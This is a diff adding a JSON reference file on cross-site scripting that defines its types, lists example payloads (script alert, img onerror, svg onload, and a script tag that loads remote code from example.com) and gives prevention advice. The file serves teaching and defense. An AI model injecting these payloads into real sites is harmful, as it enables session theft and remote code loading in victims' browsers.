@@ -1,0 +1,22 @@
+﻿{
+  "xss": {
+    "type": {
+      "reflected": "Reflected XSS occurs when user input is immediately returned in server responses without proper escaping.",
+      "stored": "Stored XSS occurs when user input is stored by the server and later rendered in a page without sanitization.",
+      "dom_based": "DOM-based XSS occurs when client-side scripts write unsanitized input into the DOM.",
+      "blind": "Blind XSS occurs when the attacker cannot see the result directly and must infer success from triggered actions."
+    },
+    "payloads": {
+      "simple": "<script>alert(1)</script>",
+      "src_based": "<script src=\"https://example.com/payload.js\"></script>",
+      "event_handler": "<img src=\"x\" onerror=\"alert('xss')\">",
+      "attribute": "<svg onload=\"alert('xss')\"></svg>"
+    },
+    "prevention": {
+      "encoding": "Encode user input before inserting it into HTML or attributes.",
+      "validation": "Validate input types and lengths, but do not rely on validation alone.",
+      "content_security_policy": "Use CSP to reduce the impact of XSS vulnerabilities.",
+      "http_only_cookies": "Set cookies to httpOnly to reduce exposure to client-side scripts."
+    }
+  }
+}
